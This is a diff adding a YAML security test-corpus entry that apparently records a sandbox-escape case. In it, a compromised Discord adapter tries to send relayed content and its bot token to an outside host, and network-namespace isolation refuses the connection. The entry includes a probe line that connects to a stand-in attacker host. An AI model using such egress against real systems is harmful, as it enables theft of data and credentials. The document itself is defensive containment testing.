@@ -1,0 +1,29 @@
+id: sbx-2026-014
+category: sandbox_escape
+threat: >-
+  A runtime-compromised Discord adapter opens an outbound TCP connection to an
+  arbitrary attacker host to exfiltrate the T3 content it relays and its bot
+  token. Spec C G7-4 (#333) --unshare-net's it into an EMPTY network namespace;
+  egress is ONLY via the bind-mounted gateway L7 CONNECT proxy socket at
+  /home/alfred/.egress/discord/egress.sock (Discord allowlist enforced at the
+  gateway). The direct connection is refused at the kernel.
+ingestion_path: sandbox_policy_load
+payload:
+  attack: outbound_network_egress_to_arbitrary_host
+  policy_ref: config/sandbox/discord-adapter.linux.bwrap.policy
+  probe: socket.create_connection(('attacker.example', 443))
+expected_outcome: refused
+provenance: >-
+  G7-4 (#333) ships the Discord adapter under ``--unshare-net`` (ADR-0043),
+  closing the egress gap that was marked deferred in pre-G7-4 policy versions
+  (the unshare line was present structurally but enforcement was intentionally
+  deferred). All outbound network access now routes exclusively through the
+  bind-mounted gateway L7 CONNECT forward-proxy socket; a direct ``connect(2)``
+  to any host is refused at the kernel. This corpus entry records the containment
+  as enforced; the executable assertion (``test_sbx_2026_014_discord_outbound_contained``)
+  verifies the shipped policy bytes genuinely include ``--unshare-net``, and the
+  kernel-observable proof lives in
+  ``tests/integration/egress/test_discord_policy_kernel_enforced.py``.
+references:
+  - "config/sandbox/discord-adapter.linux.bwrap.policy (EGRESS via gateway proxy only — unshare net)"
+  - "docs/adr/0043-discord-adapter-egress-l7-proxy-netns-bridge.md"
